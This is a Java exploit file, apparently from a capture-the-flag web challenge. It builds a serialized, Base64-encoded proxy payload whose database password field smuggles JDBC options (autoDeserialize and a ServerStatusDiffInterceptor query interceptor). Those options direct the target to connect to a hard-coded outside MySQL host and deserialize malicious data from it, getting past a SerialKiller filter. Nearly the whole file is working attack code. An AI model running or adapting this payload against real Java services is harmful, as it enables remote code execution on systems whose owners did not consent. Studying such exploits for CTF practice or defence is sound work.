package gdufs.challenge.web;

import gdufs.challenge.web.invocation.InfoInvocationHandler;
import gdufs.challenge.web.model.DatabaseInfo;
import gdufs.challenge.web.model.Info;
import org.nibblesec.tools.SerialKiller;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.util.Base64;

public class exp {
    public static void setFieldValue(Object obj, String fieldname, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj,value);
    }
    //    public static void unserialize(byte[] bytes) throws Exception{
//        try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes);
//            ObjectInputStream oin = new ObjectInputStream(bain)){
//            oin.readObject();
//        }
//    }
    public static Object unserialize(byte[] bytes) throws Exception{
        Object obj;
        try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes);
            ObjectInputStream oin = new ObjectInputStream(bain)){
            obj = oin.readObject();
            return obj;
        }
    }
    public static byte[] serialize(Object o) throws Exception{
        try(ByteArrayOutputStream baout = new ByteArrayOutputStream();
            ObjectOutputStream oout = new ObjectOutputStream(baout)){
            oout.writeObject(o);
            return baout.toByteArray();
        }
    }

//    private static Object deserialize(String base64data) {
//        Object obj;
//        ByteArrayInputStream bais = new ByteArrayInputStream(Base64.getDecoder().decode(base64data));
//        try {
//            SerialKiller serialKiller = new SerialKiller(bais, "/Users/fmyyy/tools/serialkiller.conf");
//            obj = serialKiller.readObject();
//            serialKiller.close();
//        } catch (Exception e) {
//            e.printStackTrace();
//            return null;
//        }
//        return obj;
//    }


    public static void main(String[] args) throws Exception {
        Info databaseInfo = new DatabaseInfo();
        setFieldValue(databaseInfo, "host", "47.101.176.40");
        setFieldValue(databaseInfo, "port", "33060");
        setFieldValue(databaseInfo, "username", "fmyyy");
        setFieldValue(databaseInfo, "password", "fmyyy&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor");
        Class clazz = Class.forName("gdufs.challenge.web.invocation.InfoInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Info.class);
        construct.setAccessible(true);
//        System.out.println("123");
        InfoInvocationHandler handler = (InfoInvocationHandler) construct.newInstance(databaseInfo);
        Info proxinfo = (Info) Proxy.newProxyInstance(Info.class.getClassLoader(), new Class[] {Info.class}, handler);
        byte[] bytes = serialize(proxinfo);
        byte[] payload = Base64.getEncoder().encode(bytes);
        System.out.print(new String(payload));
//        Info info1 = (Info)deserialize(new String(payload));
//        info1.getAllInfo();
    }
}

